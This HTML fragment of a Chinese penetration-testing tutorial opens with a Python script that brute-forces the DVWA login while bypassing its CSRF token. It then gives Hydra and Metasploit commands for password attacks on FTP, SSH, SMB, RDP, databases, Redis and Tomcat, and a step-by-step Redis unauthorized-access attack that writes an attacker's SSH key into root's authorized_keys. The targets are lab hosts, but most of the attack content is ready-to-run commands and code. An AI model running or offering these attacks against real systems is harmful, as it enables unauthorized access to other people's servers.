class="line">    token_pattern = re.compile(<span class="string">r"name='user_token' value='(.*?)'"</span>)</span><br><span class="line">    token = token_pattern.findall(index_html)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_with_token</span><span class="params">(uname, passwd, headers)</span>:</span></span><br><span class="line">    token = get_token(headers)</span><br><span class="line">    brute_url = <span class="string">f'http://127.0.0.1:8888/vulnerabilities/brute/index.php?username=<span class="subst">&#123;uname&#125;</span>&amp;password=<span class="subst">&#123;passwd&#125;</span>&amp;Login=Login&amp;user_token=<span class="subst">&#123;token&#125;</span>'</span></span><br><span class="line">    r = requests.get(url=brute_url, headers=headers)</span><br><span class="line">    print(<span class="string">f'<span class="subst">&#123;token&#125;</span>:<span class="subst">&#123;uname&#125;</span>:<span class="subst">&#123;passwd&#125;</span>'</span>, end=<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hackable'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">'\nBingo 爆破成功'</span>)</span><br><span class="line">        print(<span class="string">f'username:<span class="subst">&#123;uname&#125;</span> \npassword:<span class="subst">&#123;passwd&#125;</span>\n'</span>)</span><br><span class="line">        os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'127.0.0.1:8888'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'csrftoken=zeS7KCvlVoiNMuxtdrjF77dC88sqib2J2nYf4alfeDwKeaSaEMDA5wFIH9yf8kyz; PHPSESSID=bqfflff6be4tgg69lfnv4g4ik4; security=high'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = sys.argv[<span class="number">1</span>]</span><br><span class="line">    password_path = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(password_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = <span class="string">''</span>.join(f.readlines()).split(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> lines:</span><br><span class="line">            brute_with_token(username, password, headers)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'文件读取异常'</span>)</span><br></pre></td></tr></table></figure>
+<p>脚本使用方法和效果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python brute.py admin pass.txt</span><br><span class="line"></span><br><span class="line">7e43d35b6c656afdf926a95a55d6252e:admin:Pass999</span><br><span class="line">...</span><br><span class="line">f6f9db1ba43dfd57288fb73159503652:admin:password</span><br><span class="line"></span><br><span class="line">Bingo 爆破成功</span><br><span class="line">username:admin</span><br><span class="line">password:password</span><br></pre></td></tr></table></figure>
+<h1 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h1><p>国内常见弱口令：</p>
+<p><img src="http://qiniuyun.lintstar.top/image-20200728141811750.png" alt="image-20200728141811750"></p>
+<h2 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h2><p><img src="http://qiniuyun.lintstar.top/20200802163842.png" alt="20200802163842"></p>
+<h2 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra 九头蛇"></a>Hydra 九头蛇</h2><p><strong><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">https://github.com/vanhauser-thc/thc-hydra</a></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># FTP爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ftp://192.168.0.1 -vV</span><br><span class="line"></span><br><span class="line"># SSH 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ssh://192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"># SMB 爆破</span><br><span class="line">hydra -l admin -P password.txt smb://10.211.55.9</span><br><span class="line"></span><br><span class="line"># MSSQL 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mssql -vV</span><br><span class="line"></span><br><span class="line"># MySQL 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt 192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure>
+<h2 id="SNETCracker"><a href="#SNETCracker" class="headerlink" title="SNETCracker"></a>SNETCracker</h2><p><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a></p>
+<p>超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查。</p>
+<blockquote>
+<p>SSH登录发生异常！Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies. 找不到指定的模块。</p>
+</blockquote>
+<p>这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP 错误一般是线程过多，一般建议最好在 10 个以内，自己慢慢试，线程多了就会出问题。</p>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p>
+<p>RAPID7 团队出品。Offensive Security 团队</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set rhosts 10.20.xx.xxx</span><br><span class="line">set username admin</span><br><span class="line">set pass_file /Users/sec/Documents/Sec/hydra/password.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h2 id="常见爆破思路"><a href="#常见爆破思路" class="headerlink" title="常见爆破思路"></a>常见爆破思路</h2><h3 id="爆破-21-FTP"><a href="#爆破-21-FTP" class="headerlink" title="爆破 21 FTP"></a>爆破 21 FTP</h3><p>FTP（File Transfer Protocol，文件传输协议） 是TCP/IP 协议组中的协议之一。</p>
+<p>hydra 指令：</p>
+<p><code>hydra -L user.txt -P password.txt ftp://127.0.0.1</code></p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-22-SSH"><a href="#爆破-22-SSH" class="headerlink" title="爆破 22 SSH"></a>爆破 22 SSH</h3><p>SSH 为 Secure Shell 的缩写，是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。默认端口为 22</p>
+<p>爆破前检测是否开启数据库外连，不要做无意义的爆破。</p>
+<blockquote>
+<p>SSH 爆破 判断对方是否开启公私钥</p>
+</blockquote>
+<p>hydra 指令<br><code>hydra -L user.txt -P password.txt ssh://127.0.0.1</code></p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-23-Telnet"><a href="#爆破-23-Telnet" class="headerlink" title="爆破 23 Telnet"></a>爆破 23 Telnet</h3><p>Telnet 协议是 Internet 远程登录服务的标准协议和主要方式。</p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfuse auxiliary/scanner/telnet/telnet_login</span><br></pre></td></tr></table></figure>
+<p>超级弱口令工具和 Hydra 爆破 Telnet 不太行，尽量使用 MSF 爆破 Telnet 爆破</p>
+<h3 id="爆破-445-SMB"><a href="#爆破-445-SMB" class="headerlink" title="爆破 445 SMB"></a>爆破 445 SMB</h3><p>SMB(Server Message Block) Windows协议族，用于文件和打印共享服务。</p>
+<blockquote>
+<p>SMB 和 RDP 用户都是一样的<br>能爆破SMB就不爆破RDP<br>另外 SMB 爆破还与防火墙是否关闭有关系，总的来说 SMB 爆破首选 MSF</p>
+</blockquote>
+<p>hydra 指令：</p>
+<p><code>hydra -L user.txt -P password.txt smb://127.0.0.1</code></p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-Samba"><a href="#爆破-Samba" class="headerlink" title="爆破 Samba"></a>爆破 Samba</h3><p>Samba 是种用来让 UNIX 系列的操作系统与微软 Windows 操作系统的 SMB 网络协议做链接的自由软件。</p>
+<h3 id="爆破-1433-MSSQL"><a href="#爆破-1433-MSSQL" class="headerlink" title="爆破 1433 MSSQL"></a>爆破 1433 MSSQL</h3><p>MSSQL 是指微软的 SQLServer 数据库，默认端口为 1433 ，默认最高权限用户为 sa ，拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。</p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。默认端口为 1521 端口，和其他数据库不同的是，爆破前得先爆破对应的 SID，不过 SID 很多都是默认的，可以使用 MSF 来进行爆破。</p>
+<p>Metasploit 爆破 SID<br>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/sid_brut</span><br></pre></td></tr></table></figure>
+<p>Metasploit 爆破 Oracle<br>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-3306-MySQL"><a href="#爆破-3306-MySQL" class="headerlink" title="爆破 3306 MySQL"></a>爆破 3306 MySQL</h3><p>MySQL 是一个关系型数据库管理系统，默认端口为 3306</p>
+<p>爆破前检测是否开启数据库外连，不要做无意义的爆破。</p>
+<p>hydra 指令：</p>
+<p><code>hydra -L user.txt -P password.txt mysql://127.0.0.1</code></p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-3389-RDP"><a href="#爆破-3389-RDP" class="headerlink" title="爆破 3389 RDP"></a>爆破 3389 RDP</h3><p>远程桌面协议 RDP （Remote Display Protocol ）是 Windows 的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到 Windows 计算机，默认端口为 3389</p>
+<p>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为 administrator。此外如果对方服务器开启了 SMB 445 端口的话尽量优先爆破 SMB，因为 RDP 协议比较脆弱，经不起高速的爆破。</p>
+<h3 id="爆破-5432-PostgreSQL"><a href="#爆破-5432-PostgreSQL" class="headerlink" title="爆破 5432 PostgreSQL"></a>爆破 5432 PostgreSQL</h3><p>PostgreSQL 是一种对象-关系型数据库管理系统，默认端口为 5432</p>
+<p>可以直接使用超级弱口令工具爆破也可以使用 Metasploit 来进行爆破。</p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-6379-Redis"><a href="#爆破-6379-Redis" class="headerlink" title="爆破 6379 Redis"></a>爆破 6379 Redis</h3><p>Redis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。默认端口为 6379</p>
+<p>可以直接使用超级弱口令工具爆破也可以使用 Metasploit。</p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/redis/redis_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-8080-Tomcat"><a href="#爆破-8080-Tomcat" class="headerlink" title="爆破 8080 Tomcat"></a>爆破 8080 Tomcat</h3><p>Tomcat 是由 Apache 软件基金会属下Jakarta项目开发的 Servlet 容器，默认端口为 8080</p>
+<p>可以使用 Burp 的 Basic 认证爆破也可以直接使用 MSF 的模块来进行爆破。Tomcat口令是用户名在<code>/conf/tomcat-users.xml</code>自定义配置的，容易出现弱口令，Tomcat口令泄露的话 很容易被getshell 所以需要加固口令。</p>
+<p>msf 模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-27017-MongoDB"><a href="#爆破-27017-MongoDB" class="headerlink" title="爆破 27017 MongoDB"></a>爆破 27017 MongoDB</h3><p>MongoDB 是一个基于分布式文件存储的数据库，当配置成无验证时，存在未授权访问。默认端口为 27017</p>
+<p>可以直接使用超级弱口令工具爆破也可以使用 Metasploit。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mongodb/mongodb_login</span><br></pre></td></tr></table></figure>
+<h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><p>未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。</p>
+<p>未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。</p>
+<h2 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h2><p>Redis 是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+<p>Redis 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行操作。</p>
+<h3 id="Windows-安装"><a href="#Windows-安装" class="headerlink" title="Windows 安装"></a>Windows 安装</h3><p>下载地址：<a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">https://github.com/microsoftarchive/redis/releases</a></p>
+<p>打开一个 cmd 窗口 使用命令切换到 Redis 运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server.exe redis.windows.conf</span><br></pre></td></tr></table></figure>
+<p>后面的那个 redis.windows.conf 可以省略，如果省略，会启用默认的</p>
+<h4 id="一些基本的交互命令"><a href="#一些基本的交互命令" class="headerlink" title="一些基本的交互命令"></a>一些基本的交互命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 切换到 Redis 目录下运行：</span><br><span class="line">redis-cli.exe -h 127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line"># 查看Redis的相关信息</span><br><span class="line">127.0.0.1:6379&gt;info</span><br><span class="line"></span><br><span class="line"># SET 设置键值对测试</span><br><span class="line">127.0.0.1:6379&gt; SET X &quot;Tomorrow is a another day&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET X</span><br><span class="line">&quot;Tomorrow is a another day&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="Linux-编译安装"><a href="#Linux-编译安装" class="headerlink" title="Linux 编译安装"></a>Linux 编译安装</h3><p>下载地址：<a href="https://redis.io/download" target="_blank" rel="noopener">https://redis.io/download</a></p>
+<p><img src="http://qiniuyun.lintstar.top/image-20200802235015381.png" alt="image-20200802235015381"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 下载Redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压</span><br><span class="line">tar zxvf redis-5.0.5..tar.gz</span><br><span class="line"></span><br><span class="line"># 到src目录下</span><br><span class="line">cd redis-5.0.5/src</span><br><span class="line"></span><br><span class="line"># 编译</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>编译成功如下：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200803094635.png" alt="20200803094635"></p>
+<p>make 完后 Redis 的 src 目录下会出现编译后的 Redis 服务程序 Redis-server ，还有用于测试的客户端程序 Redis-cli：</p>
+<p>下面启动 Redis 服务:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">./redis-server</span><br></pre></td></tr></table></figure>
+<p><code>注意这种方式启动 Redis 使用的是默认配置。也可以通过启动参数告诉 Redis 使用指定配置文件使用下面命令启动。redis.conf 是一个默认的配置文件。我们可以根据需要使用自己的配置文件。</code></p>
+<p>启动 Redis 服务进程后，就可以使用测试客户端程序 redis-cli 和 Redis 服务交互了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali-linux:~/redis-5.0.5/src# ./redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; SET y &quot;Linux Redis is Running&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET y</span><br><span class="line">&quot;Linux Redis is Running&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200803094831.png" alt="20200803094831"></p>
+<h3 id="Linux-apt-安装"><a href="#Linux-apt-安装" class="headerlink" title="Linux apt 安装"></a>Linux apt 安装</h3><p>在 Ubuntu 系统安装 Redis 可以使用以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装redis</span></span><br><span class="line">$ sudo apt-get install redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动redis</span></span><br><span class="line">$ redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试连接</span></span><br><span class="line">$ redis-cli</span><br></pre></td></tr></table></figure>
+<h3 id="未授权访问修改公私钥"><a href="#未授权访问修改公私钥" class="headerlink" title="未授权访问修改公私钥"></a>未授权访问修改公私钥</h3><p>Redis 未授权访问在4.x/5.0.5以前版本下，我们可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
+<h4 id="安装配置SSH"><a href="#安装配置SSH" class="headerlink" title="安装配置SSH"></a>安装配置SSH</h4><p>首先受害者Redis的服务器配置好公司钥登录的情况下可以直接通过修改秘钥来直接登录到服务器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装openssh-server</span></span><br><span class="line">apt install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许root远程登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PermitRootLogin yes"</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启SSH</span></span><br><span class="line">systemctl start sshd</span><br></pre></td></tr></table></figure>
+<h4 id="配置公私钥"><a href="#配置公私钥" class="headerlink" title="配置公私钥"></a>配置公私钥</h4><p>ssh 公私钥 <code>\n\n\n 换三行不然公私钥会乱码</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成公私钥</span></span><br><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 到ssh公私钥放的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将公钥的内容拷贝到authorized_keys文件中</span></span><br><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭密码登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"PasswordAuthentication no"</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启ssh</span></span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+<p>将<code>id-rsa</code>拷贝到自己的机器上，用于连接SSH使用。</p>
+<p>客户端尝试公私钥登录:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将拷贝下来的私钥设置600权限</span></span><br><span class="line">chmod 600 ~/Downloads/id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥登陆</span></span><br><span class="line">ssh -i ~/Downloads/id_rsa root@10.211.55.4</span><br></pre></td></tr></table></figure>
+<h4 id="模拟真实攻击"><a href="#模拟真实攻击" class="headerlink" title="模拟真实攻击"></a>模拟真实攻击</h4><table>
+<thead>
+<tr>
+<th>攻击者</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>macOS 本机</td>
+<td>10.211.55.2</td>
+</tr>
+<tr>
+<td>Kali Linux 虚拟机</td>
+<td>10.211.55.4</td>
+</tr>
+</tbody>
+</table>
+<p>Kali Linux虚拟机配置下Redis配置文件关闭 IP地址绑定：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root/redis-5.0.5</span><br><span class="line">$ vim redis.conf</span><br></pre></td></tr></table></figure>
+<p>去掉ip绑定，允许除本地外的主机远程登录redis服务，需要注释掉如下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>关掉保护模式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure>
+<p>然后重启下Redis服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/image-20190930070624566.png" alt="image-20190930070624566"></p>
+<p>首先<strong>攻击者</strong>先本地生成一对公私钥：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200809021235.png" alt="20200809021235"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 连接redis</span></span><br><span class="line">$ redis-cli -h 10.211.55.4 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前路径</span></span><br><span class="line">10.211.55.4:6379&gt; config get dir</span><br><span class="line">1) <span class="string">"dir"</span></span><br><span class="line">2) <span class="string">"/root/redis-5.0.5"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt; config get dbfilename</span><br><span class="line">1) <span class="string">"dbfilename"</span></span><br><span class="line">2) <span class="string">"dump.rdb"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看设置好的路径</span></span><br><span class="line">10.211.55.4:6379&gt; config get dir</span><br><span class="line">1) <span class="string">"dir"</span></span><br><span class="line">2) <span class="string">"/root/.ssh"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查案设置好的文件</span></span><br><span class="line">10.211.55.4:6379&gt; config get dbfilename</span><br><span class="line">1) <span class="string">"dbfilename"</span></span><br><span class="line">2) <span class="string">"authorized_keys"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入公钥的值</span></span><br><span class="line">10.211.55.4:6379&gt; <span class="built_in">set</span> x <span class="string">"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDq1+O0Ht8S9iAdLE1btr0A14yR5dqS3mO9cWm5gasdYh+ZT31yZ+FoFo4IRZt+T7oliRgKO4krhmARpFmAj5B0C6Tv6N6js4lvdGBlV1AhPCnp2f+3mLZ+t97vUhF7pXXxdnu8759PJZ5IwjfVsRiCgnFY3p3eDY4kCl5nVqQm71MyaOX7FZwzsNvS3ZjP3tiy0drnVnr2QSrtKWSpuzxXApPupVS7HkcyuE9zbbckuo3cOMhFk8N9R0eIokALcXlvTXjqUwwQvU79F4D4YhFeDDovZp43mggSq4Oxsy/soL79XrIv2Hpv0cUUAEp1RDKyF3V1MH1O7fdyb63xd6R5 sqlsec@com\n\n\n"</span></span><br><span class="line">OK</span><br><span class="line"></span><br><span 